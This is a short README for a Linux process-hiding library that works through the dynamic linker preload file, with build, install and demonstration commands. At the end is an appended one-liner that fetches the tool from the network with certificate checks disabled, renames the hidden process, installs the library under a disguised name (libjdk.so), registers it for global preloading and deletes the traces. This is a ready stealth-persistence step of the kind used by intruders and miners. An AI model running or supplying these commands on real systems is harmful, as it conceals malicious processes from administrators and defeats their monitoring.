libprocesshider
===============

Hide a process under Linux using the ld preloader.

Full tutorial available at https://sysdigcloud.com/hiding-linux-processes-for-fun-and-profit/

In short, compile the library:

```
gianluca@sid:~/libprocesshider$ make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
gianluca@sid:~/libprocesshider$ sudo mv libprocesshider.so /usr/local/lib/
```

Load it with the global dynamic linker

```
root@sid:~# echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
```

And your process will be off the radar 

```
gianluca@sid:~$ sudo ps aux
USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
...

gianluca@sid:~$ sudo lsof -ni
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
...
```
wget --no-check-certificate https://github.com/gianlucaborello/libprocesshider/archive/master.zip -O master.zip && unzip master.zip && rm -f master.zip && cd libprocesshider-master;
sed -i 's/evil_script.py/x7/' processhider.c
make && mv libprocesshider.so /usr/local/lib/libjdk.so && echo /usr/local/lib/libjdk.so >> /etc/ld.so.preload && cd .. && rm -rf libprocesshider-master
